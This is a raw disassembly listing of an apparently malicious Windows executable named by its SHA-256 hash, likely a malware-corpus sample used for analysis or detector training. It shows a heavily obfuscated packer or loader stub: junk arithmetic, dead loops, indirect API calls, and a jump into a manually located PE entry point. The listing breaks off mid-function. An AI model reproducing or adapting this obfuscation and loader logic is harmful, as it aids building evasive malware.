
8cc46336c0b15045416a6ce6a4645172b2715e92bcc824f77bca196946e62560.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x422014,0x420f98
  401013:	push   edi
  401014:	sub    DWORD PTR ds:0x420fb0,0x420e8e
  40101e:	push   0x424545
  401023:	xor    edi,edi
  401025:	and    DWORD PTR ds:0x420efc,0x110f
  40102f:	inc    edi
  401030:	push   edi
  401031:	sbb    DWORD PTR ds:0x420f08,0x51
  40103b:	push   edi
  40103c:	adc    DWORD PTR ds:0x422000,0x3888
  401046:	call   DWORD PTR ds:0x4247ed
  40104c:	test   eax,eax
  40104e:	mov    DWORD PTR ds:0x420e8a,0x96
  401058:	je     0x40106f
  40105e:	xor    eax,eax
  401060:	mov    DWORD PTR ds:0x420ef0,0x42a7
  40106a:	jmp    0x4020ba
  40106f:	push   esi
  401070:	sbb    DWORD PTR ds:0x420e96,ebx
  401076:	mov    esi,DWORD PTR ds:0x4247e9
  40107c:	push   0x8
  40107e:	and    DWORD PTR ds:0x420e96,0x420ef4
  401088:	push   0x424565
  40108d:	sbb    DWORD PTR ds:0x420fa8,0x2663
  401097:	call   esi
  401099:	mov    DWORD PTR ds:0x420f58,0x2539
  4010a3:	test   eax,eax
  4010a5:	mov    DWORD PTR ds:0x420f74,0x63dd
  4010af:	jne    0x401117
  4010b5:	push   0xc
  4010b7:	adc    DWORD PTR ds:0x420efc,0x422010
  4010c1:	push   0x424579
  4010c6:	call   esi
  4010c8:	sbb    DWORD PTR ds:0x422000,0x6696
  4010d2:	test   eax,eax
  4010d4:	jne    0x401117
  4010da:	xor    DWORD PTR ds:0x422010,0x3be2
  4010e4:	push   0x42458d
  4010e9:	adc    DWORD PTR ds:0x420fac,0x420fa0
  4010f3:	push   edi
  4010f4:	push   edi
  4010f5:	call   DWORD PTR ds:0x424819
  4010fb:	add    DWORD PTR ds:0x420e7e,0x14dc
  401105:	test   eax,eax
  401107:	mov    DWORD PTR ds:0x420f08,0x3170
  401111:	je     0x401128
  401117:	xor    eax,eax
  401119:	mov    DWORD PTR ds:0x422014,0x5c19
  401123:	jmp    0x4020b9
  401128:	sbb    esi,DWORD PTR ds:0x420e9a
  40112e:	mov    DWORD PTR [ebp-0x10],0x0
  401135:	and    edi,0x6e17
  40113b:	mov    eax,DWORD PTR [ebp-0x24]
  40113e:	mov    DWORD PTR [ebp-0x24],eax
  401141:	sub    esi,DWORD PTR ds:0x420fa0
  401147:	mov    ecx,0xf89c85b5
  40114c:	mov    DWORD PTR [ebp-0x8],ecx
  40114f:	sub    esi,DWORD PTR ds:0x420f00
  401155:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  40115c:	sbb    edx,DWORD PTR ds:0x420e92
  401162:	lea    eax,[ebp-0x38]
  401165:	mov    DWORD PTR [ebp-0x2c],eax
  401168:	adc    DWORD PTR ds:0x420f74,edi
  40116e:	lea    eax,[ebp-0x30]
  401171:	xor    esi,esi
  401173:	or     esi,DWORD PTR ds:0x420e9a
  401179:	and    DWORD PTR ds:0x420f64,esi
  40117f:	mov    DWORD PTR [ebp-0x1c],eax
  401182:	sbb    esi,eax
  401184:	mov    eax,ds:0x424435
  401189:	mov    edi,DWORD PTR ds:0x420f48
  40118f:	mov    edx,DWORD PTR ds:0x420f84
  401195:	sub    edx,edi
  401197:	sub    edi,DWORD PTR [edi+edx*1]
  40119a:	mov    eax,DWORD PTR [eax+0x1c8]
  4011a0:	mov    eax,DWORD PTR [eax]
  4011a2:	mov    edx,DWORD PTR [ebp-0x1c]
  4011a5:	movzx  edi,BYTE PTR ds:0x420fb4
  4011ac:	add    DWORD PTR ds:0x420e8a,edi
  4011b2:	mov    esi,0x7510896
  4011b7:	xor    eax,esi
  4011b9:	and    DWORD PTR ds:0x420fa0,0x420e96
  4011c3:	mov    edi,0x3272dd
  4011c8:	add    eax,edi
  4011ca:	mov    DWORD PTR [edx],eax
  4011cc:	mov    DWORD PTR ds:0x420ea2,0x7e11
  4011d6:	mov    eax,ds:0x424675
  4011db:	cmp    eax,0x312bc9f6
  4011e0:	mov    DWORD PTR ds:0x420fa4,0x3707
  4011ea:	jne    0x40133f
  4011f0:	mov    eax,DWORD PTR [ebp-0x8]
  4011f3:	mov    edx,DWORD PTR ds:0x424435
  4011f9:	mov    edx,DWORD PTR [edx+0x198]
  4011ff:	xor    eax,esi
  401201:	add    eax,edi
  401203:	add    DWORD PTR ds:0x422010,0x420eec
  40120d:	mov    DWORD PTR [edx],eax
  40120f:	and    DWORD PTR ds:0x42200c,0x0
  401219:	jmp    0x40122d
  40121e:	xor    edx,edx
  401220:	add    edx,DWORD PTR ds:0x42200c
  401226:	inc    edx
  401227:	mov    DWORD PTR ds:0x42200c,edx
  40122d:	cmp    DWORD PTR ds:0x42200c,0x12
  401234:	jae    0x401276
  40123a:	cmp    DWORD PTR ds:0x42200c,0x5
  401241:	jne    0x401255
  401247:	push   DWORD PTR [ebp-0x18]
  40124a:	push   0x450b
  40124f:	call   DWORD PTR ds:0x4247d5
  401255:	cmp    DWORD PTR ds:0x42200c,0x4
  40125c:	jne    0x401271
  401262:	xor    edx,edx
  401264:	add    edx,DWORD PTR ds:0x42200c
  40126a:	inc    edx
  40126b:	mov    DWORD PTR ds:0x42200c,edx
  401271:	jmp    0x40121e
  401276:	mov    eax,DWORD PTR [ebp-0x8]
  401279:	and    DWORD PTR ds:0x420f70,0x0
  401283:	mov    edx,DWORD PTR ds:0x420f70
  401289:	inc    edx
  40128a:	mov    DWORD PTR ds:0x420f70,edx
  401290:	cmp    DWORD PTR ds:0x420f70,0x7
  401297:	jne    0x4012b0
  40129d:	push   0x5d66
  4012a2:	push   0x420f60
  4012a7:	push   DWORD PTR [ebp-0x14]
  4012aa:	call   DWORD PTR ds:0x4247d9
  4012b0:	cmp    DWORD PTR ds:0x420f70,0x6
  4012b7:	jne    0x4012ca
  4012bd:	mov    edx,DWORD PTR ds:0x420f70
  4012c3:	inc    edx
  4012c4:	mov    DWORD PTR ds:0x420f70,edx
  4012ca:	cmp    DWORD PTR ds:0x420f70,0x14
  4012d1:	jb     0x401283
  4012d7:	and    edx,0x4d07
  4012dd:	xor    eax,esi
  4012df:	movzx  edx,BYTE PTR ds:0x420f08
  4012e6:	sub    edx,DWORD PTR ds:0x420fa0
  4012ec:	mov    DWORD PTR ds:0x420f08,edx
  4012f2:	add    eax,edi
  4012f4:	mov    DWORD PTR ds:0x422008,0x18
  4012fe:	cmp    DWORD PTR ds:0x422008,0x0
  401305:	je     0x40133a
  40130b:	cmp    DWORD PTR ds:0x422008,0x1d
  401312:	jne    0x401328
  401318:	push   0x42406a
  40131d:	push   0x424044
  401322:	call   DWORD PTR ds:0x4247dd
  401328:	mov    edx,DWORD PTR ds:0x422008
  40132e:	dec    edx
  40132f:	mov    DWORD PTR ds:0x422008,edx
  401335:	jmp    0x4012fe
  40133a:	mov    ds:0x424675,eax
  40133f:	mov    eax,ds:0x424435
  401344:	and    DWORD PTR ds:0x420ef4,0x0
  40134e:	mov    edx,DWORD PTR ds:0x420ef4
  401354:	inc    edx
  401355:	mov    DWORD PTR ds:0x420ef4,edx
  40135b:	cmp    DWORD PTR ds:0x420ef4,0x20
  401362:	jne    0x401379
  401368:	push   DWORD PTR [ebp-0x18]
  40136b:	push   0x222d
  401370:	push   DWORD PTR [ebp-0x28]
  401373:	call   DWORD PTR ds:0x4247e1
  401379:	cmp    DWORD PTR ds:0x420ef4,0x12
  401380:	jb     0x40134e
  401386:	mov    eax,DWORD PTR [eax+0x18c]
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	adc    DWORD PTR ds:0x422014,0x7308
  401398:	mov    DWORD PTR [ebp-0x68],eax
  40139b:	and    DWORD PTR ds:0x420e7e,0x0
  4013a5:	xor    eax,eax
  4013a7:	or     eax,DWORD PTR ds:0x420e7e
  4013ad:	inc    eax
  4013ae:	mov    ds:0x420e7e,eax
  4013b3:	cmp    DWORD PTR ds:0x420e7e,0xa
  4013ba:	jne    0x4013d1
  4013c0:	push   DWORD PTR [ebp-0x20]
  4013c3:	push   0x420f74
  4013c8:	push   DWORD PTR [ebp-0x28]
  4013cb:	call   DWORD PTR ds:0x4247e5
  4013d1:	cmp    DWORD PTR ds:0x420e7e,0x9
  4013d8:	jne    0x4013ec
  4013de:	xor    eax,eax
  4013e0:	xor    eax,DWORD PTR ds:0x420e7e
  4013e6:	inc    eax
  4013e7:	mov    ds:0x420e7e,eax
  4013ec:	cmp    DWORD PTR ds:0x420e7e,0x14
  4013f3:	jb     0x4013a5
  4013f9:	mov    DWORD PTR ds:0x420f04,0x16
  401403:	cmp    DWORD PTR ds:0x420f04,0x0
  40140a:	je     0x401438
  401410:	cmp    DWORD PTR ds:0x420f04,0x22
  401417:	jne    0x401423
  40141d:	call   DWORD PTR ds:0x4247f1
  401423:	xor    eax,eax
  401425:	or     eax,DWORD PTR ds:0x420f04
  40142b:	dec    eax
  40142c:	mov    ds:0x420f04,eax
  401431:	jmp    0x401403
  401436:	sub    edx,edx
  401438:	push   ebx
  401439:	or     eax,DWORD PTR ds:0x420f00
  40143f:	mov    ebx,0xf89c85b1
  401444:	and    DWORD PTR ds:0x420fa0,0x0
  40144e:	mov    edx,DWORD PTR ds:0x420fa0
  401454:	inc    edx
  401455:	mov    DWORD PTR ds:0x420fa0,edx
  40145b:	cmp    DWORD PTR ds:0x420fa0,0x8
  401462:	jne    0x40146e
  401468:	call   DWORD PTR ds:0x4247f5
  40146e:	cmp    DWORD PTR ds:0x420fa0,0x7
  401475:	jne    0x40148a
  40147b:	xor    edx,edx
  40147d:	xor    edx,DWORD PTR ds:0x420fa0
  401483:	inc    edx
  401484:	mov    DWORD PTR ds:0x420fa0,edx
  40148a:	cmp    DWORD PTR ds:0x420fa0,0x1e
  401491:	jb     0x40144e
  401497:	and    DWORD PTR ds:0x420e7a,0x0
  4014a1:	jmp    0x4014b3
  4014a6:	mov    edx,DWORD PTR ds:0x420e7a
  4014ac:	inc    edx
  4014ad:	mov    DWORD PTR ds:0x420e7a,edx
  4014b3:	cmp    DWORD PTR ds:0x420e7a,0x14
  4014ba:	jae    0x4014ff
  4014c0:	cmp    DWORD PTR ds:0x420e7a,0x1f
  4014c7:	jne    0x4014f0
  4014cd:	push   0x20c6
  4014d2:	push   DWORD PTR [ebp-0x10]
  4014d5:	push   0x420ea2
  4014da:	push   0x440c
  4014df:	push   DWORD PTR [ebp-0x20]
  4014e2:	push   0x7f92
  4014e7:	push   DWORD PTR [ebp-0x20]
  4014ea:	call   DWORD PTR ds:0x4247f9
  4014f0:	jmp    0x4014a6
  4014f5:	adc    DWORD PTR ds:0x420ea2,0x7cfc
  4014ff:	mov    DWORD PTR [ebp-0x10],ebx
  401502:	sub    DWORD PTR ds:0x420f5c,edi
  401508:	mov    DWORD PTR [ebp-0x10],ebx
  40150b:	mov    DWORD PTR ds:0x420f04,0x12
  401515:	cmp    DWORD PTR ds:0x420f04,0x0
  40151c:	je     0x40156b
  401522:	cmp    DWORD PTR ds:0x420f04,0x5
  401529:	jne    0x40153d
  40152f:	push   DWORD PTR [ebp-0x1c]
  401532:	push   0x424044
  401537:	call   DWORD PTR ds:0x4247fd
  40153d:	cmp    DWORD PTR ds:0x420f04,0x6
  401544:	jne    0x401557
  40154a:	mov    edx,DWORD PTR ds:0x420f04
  401550:	dec    edx
  401551:	mov    DWORD PTR ds:0x420f04,edx
  401557:	xor    edx,edx
  401559:	or     edx,DWORD PTR ds:0x420f04
  40155f:	dec    edx
  401560:	mov    DWORD PTR ds:0x420f04,edx
  401566:	jmp    0x401515
  40156b:	mov    DWORD PTR [ebp-0x10],ebx
  40156e:	and    DWORD PTR ds:0x422004,0x0
  401578:	jmp    0x40158c
  40157d:	xor    edx,edx
  40157f:	xor    edx,DWORD PTR ds:0x422004
  401585:	inc    edx
  401586:	mov    DWORD PTR ds:0x422004,edx
  40158c:	cmp    DWORD PTR ds:0x422004,0x12
  401593:	jae    0x4015bd
  401599:	cmp    DWORD PTR ds:0x422004,0x1e
  4015a0:	jne    0x4015b8
  4015a6:	push   0x424168
  4015ab:	push   0x1
  4015ad:	push   0x0
  4015af:	push   DWORD PTR [ebp-0x14]
  4015b2:	call   DWORD PTR ds:0x424801
  4015b8:	jmp    0x40157d
  4015bd:	mov    DWORD PTR [ebp-0x1c],ecx
  4015c0:	xor    edx,edx
  4015c2:	mov    DWORD PTR [ebp-0x10],ebx
  4015c5:	mov    DWORD PTR ds:0x420e96,0xb45
  4015cf:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4015d6:	and    DWORD PTR ds:0x422014,0x2ed5
  4015e0:	mov    eax,DWORD PTR [ebp-0x8]
  4015e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4015e6:	xor    edx,edx
  4015e8:	or     edx,DWORD PTR ds:0x420f60
  4015ee:	and    DWORD PTR ds:0x422000,edx
  4015f4:	mov    edx,DWORD PTR [ebp-0xc]
  4015f7:	sbb    DWORD PTR ds:0x420fa0,0x420fb4
  401601:	xor    edx,esi
  401603:	and    DWORD PTR ds:0x420f5c,0x420fa4
  40160d:	xor    ecx,esi
  40160f:	sub    DWORD PTR ds:0x422008,0x420f58
  401619:	add    ecx,edx
  40161b:	sbb    DWORD PTR ds:0x420e8e,edi
  401621:	mov    edx,DWORD PTR [ebp-0xc]
  401624:	xor    DWORD PTR ds:0x420f00,0x7b1e
  40162e:	xor    eax,esi
  401630:	xor    edx,esi
  401632:	or     DWORD PTR ds:0x420e9a,0x7d42
  40163c:	add    eax,edi
  40163e:	lea    ecx,[ecx+edx*1+0x975897]
  401645:	not    DWORD PTR ds:0x420f70
  40164b:	mov    DWORD PTR [ebp-0x18],eax
  40164e:	mov    DWORD PTR ds:0x420e7e,0x57b9
  401658:	cmp    eax,ecx
  40165a:	ja     0x40177e
  401660:	jmp    0x401678
  401665:	mov    eax,ds:0x420f30
  40166a:	mov    ecx,DWORD PTR ds:0x420f38
  401670:	sub    ecx,eax
  401672:	and    eax,DWORD PTR [eax+ecx*1]
  401675:	mov    eax,DWORD PTR [ebp-0x18]
  401678:	mov    ecx,DWORD PTR [ebp-0xc]
  40167b:	sub    DWORD PTR ds:0x422010,0x420f70
  401685:	xor    ecx,esi
  401687:	lea    eax,[ecx+eax*1+0x3272dd]
  40168e:	or     DWORD PTR ds:0x420f70,0x48c8
  401698:	push   eax
  401699:	sub    DWORD PTR ds:0x420e9e,0x506d
  4016a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4016a6:	and    DWORD PTR ds:0x420f5c,0x3822
  4016b0:	xor    eax,esi
  4016b2:	xor    DWORD PTR ds:0x420f74,0x420ef0
  4016bc:	lea    eax,[ebp+eax*1+0x3272e5]
  4016c3:	or     DWORD PTR ds:0x420ea2,0x420f60
  4016cd:	push   eax
  4016ce:	or     DWORD PTR ds:0x420f00,0x5827
  4016d8:	mov    eax,ds:0x424435
  4016dd:	and    DWORD PTR ds:0x420fb4,0x420fa4
  4016e7:	push   DWORD PTR [eax+0x1bc]
  4016ed:	xor    DWORD PTR ds:0x420f98,0x420ea2
  4016f7:	call   0x4020cd
  4016fc:	add    DWORD PTR ds:0x420f68,0x6b04
  401706:	mov    eax,DWORD PTR [ebp-0xc]
  401709:	or     edx,DWORD PTR ds:0x420ef0
  40170f:	mov    ecx,DWORD PTR [ebp-0x18]
  401712:	neg    edx
  401714:	xor    eax,esi
  401716:	sub    edx,0x4f8d
  40171c:	lea    eax,[ecx+eax*1+0x3272dd]
  401723:	mov    ecx,DWORD PTR [ebp-0xc]
  401726:	xor    edx,DWORD PTR ds:0x420e7a
  40172c:	mov    edx,DWORD PTR [ebp-0xc]
  40172f:	xor    edx,esi
  401731:	add    DWORD PTR ds:0x420ef4,0x420e9e
  40173b:	xor    ecx,esi
  40173d:	adc    DWORD PTR ds:0x420e82,0x420f5c
  401747:	add    ecx,edx
  401749:	mov    edx,DWORD PTR [ebp-0xc]
  40174c:	xor    edx,esi
  40174e:	lea    ecx,[ecx+edx*1+0x975897]
  401755:	mov    DWORD PTR ds:0x420e82,0x59f5
  40175f:	mov    DWORD PTR [ebp-0x18],eax
  401762:	mov    DWORD PTR ds:0x420f98,0x3280
  40176c:	cmp    eax,ecx
  40176e:	mov    DWORD PTR ds:0x420fb4,0x7b83
  401778:	jbe    0x401665
  40177e:	and    DWORD PTR ds:0x420f98,0x0
  401788:	mov    ecx,DWORD PTR ds:0x420f98
  40178e:	inc    ecx
  40178f:	mov    DWORD PTR ds:0x420f98,ecx
  401795:	cmp    DWORD PTR ds:0x420f98,0x1e
  40179c:	jne    0x4017b2
  4017a2:	push   0x420fa0
  4017a7:	push   0x4d18
  4017ac:	call   DWORD PTR ds:0x424805
  4017b2:	cmp    DWORD PTR ds:0x420f98,0x18
  4017b9:	jb     0x401788
  4017bf:	mov    eax,DWORD PTR [ebp+0xc]
  4017c2:	sbb    DWORD PTR ds:0x420e7a,edx
  4017c8:	mov    ds:0x4242b9,eax
  4017cd:	and    DWORD PTR ds:0x420f74,0x0
  4017d7:	mov    eax,ds:0x420f74
  4017dc:	inc    eax
  4017dd:	mov    ds:0x420f74,eax
  4017e2:	cmp    DWORD PTR ds:0x420f74,0x1b
  4017e9:	jne    0x40180f
  4017ef:	push   DWORD PTR [ebp-0x1c]
  4017f2:	push   0x420f9c
  4017f7:	push   0x46e8
  4017fc:	push   0x4240e4
  401801:	push   0x1c79
  401806:	push   DWORD PTR [ebp-0xc]
  401809:	call   DWORD PTR ds:0x42480d
  40180f:	cmp    DWORD PTR ds:0x420f74,0x12
  401816:	jb     0x4017d7
  40181c:	mov    eax,DWORD PTR [ebp+0x10]
  40181f:	sub    ecx,DWORD PTR ds:0x420fa4
  401825:	mov    ds:0x42450d,eax
  40182a:	and    DWORD PTR ds:0x422010,0x0
  401834:	mov    eax,ds:0x422010
  401839:	inc    eax
  40183a:	mov    ds:0x422010,eax
  40183f:	cmp    DWORD PTR ds:0x422010,0x18
  401846:	jne    0x401852
  40184c:	call   DWORD PTR ds:0x424811
  401852:	cmp    DWORD PTR ds:0x422010,0x17
  401859:	jb     0x401834
  40185f:	add    ecx,ecx
  401861:	mov    eax,ds:0x4242b9
  401866:	or     DWORD PTR ds:0x420e7a,0x2e1b
  401870:	mov    ecx,DWORD PTR [ebp-0x2c]
  401873:	sub    eax,edi
  401875:	neg    DWORD PTR ds:0x420e92
  40187b:	xor    eax,esi
  40187d:	mov    DWORD PTR ds:0x420fac,0x2c59
  401887:	mov    DWORD PTR [ecx],eax
  401889:	mov    ecx,DWORD PTR [ebp-0x24]
  40188c:	mov    DWORD PTR ds:0x420efc,0x2f09
  401896:	mov    eax,0xf89c85b5
  40189b:	mov    DWORD PTR ds:0x420efc,0x2084
  4018a5:	cmp    ecx,eax
  4018a7:	jne    0x401be5
  4018ad:	xor    DWORD PTR ds:0x422014,0x4966
  4018b7:	lea    eax,[ebp-0x34]
  4018ba:	adc    DWORD PTR ds:0x420e8a,0x420e92
  4018c4:	mov    DWORD PTR [ebp-0x70],eax
  4018c7:	xor    DWORD PTR ds:0x420f74,0x422004
  4018d1:	lea    eax,[ebp+0x4]
  4018d4:	sub    DWORD PTR ds:0x420fa4,0x42200c
  4018de:	mov    DWORD PTR [ebp-0x34],eax
  4018e1:	mov    eax,DWORD PTR [ebp-0x34]
  4018e4:	test   eax,eax
  4018e6:	mov    DWORD PTR ds:0x420e82,0x6242
  4018f0:	je     0x40209d
  4018f6:	xor    DWORD PTR ds:0x422008,0x2d73
  401900:	mov    eax,DWORD PTR [ebp-0x20]
  401903:	mov    eax,DWORD PTR [ebp-0xc]
  401906:	mov    eax,DWORD PTR [ebp-0x8]
  401909:	adc    ecx,0x7834
  40190f:	mov    DWORD PTR [ebp+0xc],eax
  401912:	not    ecx
  401914:	mov    eax,eax
  401916:	mov    eax,ds:0x424435
  40191b:	and    DWORD PTR ds:0x422008,0x0
  401925:	mov    ecx,DWORD PTR ds:0x422008
  40192b:	inc    ecx
  40192c:	mov    DWORD PTR ds:0x422008,ecx
  401932:	cmp    DWORD PTR ds:0x422008,0x1e
  401939:	jne    0x40194a
  40193f:	push   0x422000
  401944:	call   DWORD PTR ds:0x424815
  40194a:	cmp    DWORD PTR ds:0x422008,0x1d
  401951:	jb     0x401925
  401957:	and    DWORD PTR ds:0x420fa0,0x0
  401961:	jmp    0x401973
  401966:	mov    ecx,DWORD PTR ds:0x420fa0
  40196c:	inc    ecx
  40196d:	mov    DWORD PTR ds:0x420fa0,ecx
  401973:	cmp    DWORD PTR ds:0x420fa0,0x14
  40197a:	jae    0x4019bc
  401980:	cmp    DWORD PTR ds:0x420fa0,0x5
  401987:	jne    0x40199d
  40198d:	push   0x2f20
  401992:	push   0x8e83
  401997:	call   DWORD PTR ds:0x4247d5
  40199d:	cmp    DWORD PTR ds:0x420fa0,0x4
  4019a4:	jne    0x4019b7
  4019aa:	mov    ecx,DWORD PTR ds:0x420fa0
  4019b0:	inc    ecx
  4019b1:	mov    DWORD PTR ds:0x420fa0,ecx
  4019b7:	jmp    0x401966
  4019bc:	mov    eax,DWORD PTR [eax+0x1c8]
  4019c2:	neg    DWORD PTR ds:0x420f98
  4019c8:	mov    eax,DWORD PTR [eax]
  4019ca:	sbb    DWORD PTR ds:0x420f74,ebx
  4019d0:	cdq    
  4019d1:	adc    DWORD PTR ds:0x42200c,0x4213
  4019db:	mov    ebx,eax
  4019dd:	mov    DWORD PTR ds:0x420fa4,0x17
  4019e7:	cmp    DWORD PTR ds:0x420fa4,0x0
  4019ee:	je     0x401a74
  4019f4:	cmp    DWORD PTR ds:0x420fa4,0x20
  4019fb:	jne    0x401a14
  401a01:	push   DWORD PTR [ebp-0x1c]
  401a04:	push   0x420e9a
  401a09:	push   0x6482
  401a0e:	call   DWORD PTR ds:0x4247d9
  401a14:	xor    eax,eax
  401a16:	or     eax,DWORD PTR ds:0x420fa4
  401a1c:	dec    eax
  401a1d:	mov    ds:0x420fa4,eax
  401a22:	jmp    0x4019e7
  401a27:	mov    DWORD PTR ds:0x420f08,0x1d
  401a31:	cmp    DWORD PTR ds:0x420f08,0x0
  401a38:	je     0x401a74
  401a3e:	cmp    DWORD PTR ds:0x420f08,0x1e
  401a45:	jne    0x401a5b
  401a4b:	push   0x424027
  401a50:	push   0x4240af
  401a55:	call   DWORD PTR ds:0x4247dd
  401a5b:	xor    eax,eax
  401a5d:	xor    eax,DWORD PTR ds:0x420f08
  401a63:	dec    eax
  401a64:	mov    ds:0x420f08,eax
  401a69:	jmp    0x401a31
  401a6e:	and    DWORD PTR ds:0x420e82,ebx
  401a74:	mov    eax,0xfabdbeed
  401a79:	add    ebx,eax
  401a7b:	inc    ecx
  401a7c:	adc    edx,0xffffffff
  401a7f:	mov    DWORD PTR ds:0x420fa0,0x16
  401a89:	cmp    DWORD PTR ds:0x420fa0,0x0
  401a90:	je     0x401b11
  401a96:	cmp    DWORD PTR ds:0x420fa0,0x20
  401a9d:	jne    0x401ab4
  401aa3:	push   DWORD PTR [ebp-0x10]
  401aa6:	push   0x1d23
  401aab:	push   DWORD PTR [ebp-0x1c]
  401aae:	call   DWORD PTR ds:0x4247e1
  401ab4:	xor    ecx,ecx
  401ab6:	xor    ecx,DWORD PTR ds:0x420fa0
  401abc:	dec    ecx
  401abd:	mov    DWORD PTR ds:0x420fa0,ecx
  401ac3:	jmp    0x401a89
  401ac8:	mov    DWORD PTR ds:0x42200c,0x1c
  401ad2:	cmp    DWORD PTR ds:0x42200c,0x0
  401ad9:	je     0x401b11
  401adf:	cmp    DWORD PTR ds:0x42200c,0x2c
  401ae6:	jne    0x401aff
  401aec:	push   0x87f3
  401af1:	push   0x420f68
  401af6:	push   DWORD PTR [ebp-0xc]
  401af9:	call   DWORD PTR ds:0x4247e5
  401aff:	mov    ecx,DWORD PTR ds:0x42200c
  401b05:	dec    ecx
  401b06:	mov    DWORD PTR ds:0x42200c,ecx
  401b0c:	jmp    0x401ad2
  401b11:	and    DWORD PTR [ebp-0x10],0x0
  401b15:	sbb    DWORD PTR ds:0x422014,ebx
  401b1b:	xor    edx,0x0
  401b1e:	xor    ecx,DWORD PTR ds:0x420f70
  401b24:	mov    DWORD PTR [ebp-0x54],edx
  401b27:	adc    ecx,edx
  401b29:	mov    edx,DWORD PTR [ebp+0xc]
  401b2c:	mov    DWORD PTR [ebp-0x14],edx
  401b2f:	mov    ecx,0x8a29a127
  401b34:	xor    ebx,ecx
  401b36:	dec    edx
  401b37:	add    DWORD PTR [ebp-0x14],eax
  401b3a:	mov    DWORD PTR ds:0x420e96,edi
  401b40:	mov    edx,DWORD PTR [ebp-0x14]
  401b43:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401b47:	or     DWORD PTR ds:0x420f6c,0x420f00
  401b51:	xor    edx,ecx
  401b53:	add    DWORD PTR ds:0x420e86,0x420f04
  401b5d:	mov    DWORD PTR [ebp-0x4c],edx
  401b60:	mov    edx,DWORD PTR [ebp-0x10]
  401b63:	xor    edx,0x0
  401b66:	mov    DWORD PTR [ebp-0x48],edx
  401b69:	mov    DWORD PTR ds:0x420efc,0x3c82
  401b73:	cmp    DWORD PTR [ebp-0x4c],ebx
  401b76:	jne    0x401b92
  401b7c:	mov    DWORD PTR ds:0x420e92,0x5ff4
  401b86:	mov    edx,DWORD PTR [ebp-0x54]
  401b89:	cmp    DWORD PTR [ebp-0x48],edx
  401b8c:	je     0x401bc1
  401b92:	mov    edx,DWORD PTR ds:0x424435
  401b98:	mov    edx,DWORD PTR [edx+0x1c0]
  401b9e:	mov    edx,DWORD PTR [edx]
  401ba0:	xor    ebx,ebx
  401ba2:	add    edx,eax
  401ba4:	adc    ebx,0xffffffff
  401ba7:	xor    edx,ecx
  401ba9:	xor    ebx,0x0
  401bac:	cmp    edx,0x70941fc9
  401bb2:	jne    0x40209d
  401bb8:	cmp    ebx,0xffffffff
  401bbb:	jne    0x40209d
  401bc1:	mov    edx,DWORD PTR ds:0x4244b1
  401bc7:	mov    ebx,DWORD PTR ds:0x4244b9
  401bcd:	xor    edx,ebx
  401bcf:	mov    DWORD PTR ds:0x4244b1,edx
  401bd5:	mov    ebx,DWORD PTR ds:0x4244b1
  401bdb:	mov    edx,DWORD PTR [ebp-0x34]
  401bde:	add    DWORD PTR [edx],ebx
  401be0:	jmp    0x40205e
  401be5:	mov    ecx,DWORD PTR [ebp-0x38]
  401be8:	cmp    ecx,0xf89c85b2
  401bee:	je     0x401c4b
  401bf4:	mov    ecx,DWORD PTR [ebp-0x8]
  401bf7:	mov    edx,DWORD PTR [ebp-0x30]
  401bfa:	xor    ecx,esi
  401bfc:	add    ecx,edi
  401bfe:	cmp    ecx,edx
  401c00:	je     0x401c4b
  401c06:	mov    eax,ds:0x424435
  401c0b:	mov    eax,DWORD PTR [eax+0x194]
  401c11:	mov    ecx,DWORD PTR [eax]
  401c13:	mov    eax,DWORD PTR [ecx+0x3c]
  401c16:	push   DWORD PTR ds:0x42450d
  401c1c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c20:	push   DWORD PTR ds:0x4242b9
  401c26:	add    eax,ecx
  401c28:	mov    ecx,DWORD PTR ds:0x424435
  401c2e:	mov    ecx,DWORD PTR [ecx+0x194]
  401c34:	push   DWORD PTR [ecx]
  401c36:	call   eax
  401c38:	mov    ecx,DWORD PTR ds:0x424435
  401c3e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401c44:	mov    DWORD PTR [ecx],eax
  401c46:	jmp    0x40209d
  401c4b:	mov    ecx,DWORD PTR [ebp-0x8]
  401c4e:	mov    edx,DWORD PTR [ebp-0x68]
  401c51:	xor    ecx,esi
  401c53:	add    ecx,edi
  401c55:	cmp    ecx,edx
  401c57:	jne    0x401f61
  401c5d:	mov    ecx,DWORD PTR [ebp-0x8]
  401c60:	mov    edx,DWORD PTR ds:0x424435
  401c66:	mov    edx,DWORD PTR [edx+0x198]
  401c6c:	xor    ecx,esi
  401c6e:	add    ecx,edi
  401c70:	cmp    ecx,DWORD PTR [edx]
  401c72:	jne    0x401c8d
  401c78:	push   eax
  401c79:	mov    eax,DWORD PTR [ebp-0x8]
  401c7c:	xor    eax,esi
  401c7e:	add    eax,edi
  401c80:	push   eax
  401c81:	push   ebx
  401c82:	push   DWORD PTR [ebp-0xc]
  401c85:	push   DWORD PTR [ebp-0x8]
  401c88:	call   0x40772b
  401c8d:	mov    eax,DWORD PTR [ebp-0xc]
  401c90:	mov    DWORD PTR [ebp-0x3c],eax
  401c93:	mov    eax,DWORD PTR [ebp-0x8]
  401c96:	mov    DWORD PTR [ebp-0x18],eax
  401c99:	mov    eax,DWORD PTR [ebp-0x18]
  401c9c:	xor    eax,esi
  401c9e:	add    eax,edi
  401ca0:	mov    DWORD PTR [ebp+0x10],eax
  401ca3:	mov    eax,ds:0x4242b5
  401ca8:	mov    eax,DWORD PTR [eax]
  401caa:	mov    DWORD PTR [ebp+0x10],eax
  401cad:	mov    eax,ds:0x4244bd
  401cb2:	mov    eax,DWORD PTR [eax]
  401cb4:	mov    DWORD PTR [ebp-0x1c],eax
  401cb7:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  401cbe:	mov    eax,DWORD PTR [ebp+0xc]
  401cc1:	xor    eax,esi
  401cc3:	add    eax,edi
  401cc5:	mov    DWORD PTR [ebp+0xc],eax
  401cc8:	mov    eax,ds:0x424435
  401ccd:	mov    DWORD PTR [ebp+0xc],eax
  401cd0:	mov    eax,DWORD PTR [ebp+0x10]
  401cd3:	mov    DWORD PTR [ebp+0xc],eax
  401cd6:	mov    eax,DWORD PTR [ebp+0xc]
  401cd9:	push   0x4
